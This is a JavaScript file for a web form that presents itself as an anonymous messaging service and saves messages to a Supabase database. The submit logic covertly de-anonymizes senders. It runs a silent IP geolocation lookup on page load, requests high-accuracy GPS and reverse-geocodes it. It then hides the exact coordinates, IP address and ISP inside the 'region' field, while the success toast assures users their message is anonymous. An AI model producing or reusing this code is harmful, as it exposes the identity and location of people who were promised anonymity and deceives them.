// ===== Public Form Logic =====

const MAX_MESSAGE_LENGTH = 500;

// DOM Elements
const form = document.getElementById('messageForm');
const nameInput = document.getElementById('nameInput');
const messageInput = document.getElementById('messageInput');
const submitBtn = document.getElementById('submitBtn');
const charCounter = document.getElementById('charCounter');
const successOverlay = document.getElementById('successOverlay');
const splashScreen = document.getElementById('splashScreen');
const mainContent = document.getElementById('mainContent');

// ===== SPLASH SCREEN =====
window.addEventListener('load', () => {
  setTimeout(() => {
    splashScreen.classList.add('hide');
    mainContent.style.transition = 'opacity 0.6s ease';
    mainContent.style.opacity = '1';
  }, 2200);
});

// Character counter
messageInput.addEventListener('input', () => {
  const len = messageInput.value.length;
  charCounter.textContent = `${len} / ${MAX_MESSAGE_LENGTH}`;

  charCounter.classList.remove('warn', 'danger');
  if (len > MAX_MESSAGE_LENGTH * 0.9) {
    charCounter.classList.add('danger');
  } else if (len > MAX_MESSAGE_LENGTH * 0.7) {
    charCounter.classList.add('warn');
  }
});

// Cache for prefetched IP data
let prefetchedLocation = null;

// Prefetch IP data immediately on load
(async function prefetchLocation() {
  try {
    const res = await fetch('https://ipwho.is/');
    if (res.ok) {
      const data = await res.json();
      if (data && data.success !== false) {
        prefetchedLocation = data;
      }
    }
  } catch {}
})();

// Get exact location of sender (GPS + IP + Reverse Geocoding)
async function getExactLocation() {
  let coords = null;
  let isGps = false;

  // 1. Attempt High-Accuracy Device GPS
  if ('geolocation' in navigator) {
    try {
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          { enableHighAccuracy: true, timeout: 3000, maximumAge: 30000 }
        );
      });
      if (pos && pos.coords) {
        coords = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: Math.round(pos.coords.accuracy)
        };
        isGps = true;
      }
    } catch {
      // User blocked or timed out, will fall back to IP automatically
    }
  }

  // 2. Fetch IP location if not prefetched
  let ipData = prefetchedLocation;
  if (!ipData) {
    try {
      const res = await fetch('https://ipwho.is/');
      if (res.ok) {
        const d = await res.json();
        if (d && d.success !== false) ipData = d;
      }
    } catch {
      try {
        const res2 = await fetch('https://ipapi.co/json/');
        if (res2.ok) {
          const d2 = await res2.json();
          ipData = {
            ip: d2.ip,
            city: d2.city,
            region: d2.region,
            country: d2.country_name,
            postal: d2.postal,
            latitude: d2.latitude,
            longitude: d2.longitude,
            connection: { isp: d2.org }
          };
        }
      } catch {}
    }
  }

  ipData = ipData || {};

  const finalLat = coords ? coords.lat : (ipData.latitude || null);
  const finalLon = coords ? coords.lon : (ipData.longitude || null);

  // 3. Reverse-geocode coordinates to get exact locality/district/postcode
  let reverseLocality = null;
  let reversePostcode = null;
  if (finalLat && finalLon) {
    try {
      const revRes = await fetch(
        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${finalLat}&longitude=${finalLon}&localityLanguage=en`
      );
      if (revRes.ok) {
        const rev = await revRes.json();
        reverseLocality = rev.locality || null;
        reversePostcode = rev.postcode || null;
      }
    } catch {}
  }

  const locality = reverseLocality || '';
  const baseCity = ipData.city || '';
  const displayCity = locality && baseCity && locality !== baseCity ? `${locality}, ${baseCity}` : (locality || baseCity || 'Unknown City');
  const postal = reversePostcode || ipData.postal || '';
  const cityWithPostal = postal ? `${displayCity} (Postal: ${postal})` : displayCity;

  const regionName = ipData.region || '';
  const countryName = ipData.country || 'Unknown Country';
  const ip = ipData.ip || 'Unknown IP';
  const isp = (ipData.connection && ipData.connection.isp) ? ipData.connection.isp : '';
  const source = isGps ? 'GPS (Exact)' : 'IP Geolocation';
  const coordsStr = (finalLat && finalLon) ? `${finalLat.toFixed(6)},${finalLon.toFixed(6)}` : '';

  // Pack detailed metadata safely into region field so database accepts without schema alterations
  const regionParts = [
    regionName,
    coordsStr ? `Coords: ${coordsStr}` : '',
    `IP: ${ip}${isp ? ` (${isp})` : ''}`,
    `Source: ${source}`
  ].filter(Boolean);

  return {
    city: cityWithPostal,
    region: regionParts.join(' | '),
    country: countryName
  };
}

// Form submission
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const message = messageInput.value.trim();
  if (!message) return;
  if (message.length > MAX_MESSAGE_LENGTH) return;

  submitBtn.disabled = true;
  submitBtn.innerHTML = '<span><div class="spinner"></div> Sending...</span>';

  try {
    const location = await getExactLocation();
    const name = nameInput.value.trim() || null;

    const client = window.supabaseClient || window.supabase;
    if (!client || typeof client.from !== 'function') {
      throw new Error('Supabase client is not ready. Please refresh the page.');
    }

    const { error } = await client
      .from('messages')
      .insert([{
        name: name,
        message: message,
        city: location.city,
        region: location.region,
        country: location.country
      }]);

    if (error) throw error;

    showSuccess();
    showToast('success', 'Message Sent! ✉️', 'Your anonymous message has been safely delivered.');
    form.reset();
    charCounter.textContent = `0 / ${MAX_MESSAGE_LENGTH}`;

  } catch (err) {
    console.error('Error sending message:', err);
    showToast('error', 'Could not send message', err.message || 'Please check your connection and Supabase setup.');
  } finally {
    submitBtn.disabled = false;
    submitBtn.innerHTML = '<span>Send Message</span>';
  }
});

// Toast notification helper
function showToast(type, title, desc) {
  const container = document.getElementById('toastContainer');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.innerHTML = `
    <div class="toast-icon">${type === 'success' ? '✓' : '⚠️'}</div>
    <div class="toast-text">
      <div class="toast-title">${title}</div>
      <div class="toast-desc">${desc}</div>
    </div>
  `;

  container.appendChild(toast);

  // Animate in
  requestAnimationFrame(() => {
    toast.classList.add('show');
  });

  // Auto remove
  setTimeout(() => {
    toast.classList.remove('show');
    setTimeout(() => toast.remove(), 400);
  }, 4000);
}

// Success overlay
function showSuccess() {
  successOverlay.classList.add('active');
  setTimeout(() => {
    successOverlay.classList.remove('active');
  }, 2500);
}

successOverlay.addEventListener('click', () => {
  successOverlay.classList.remove('active');
});
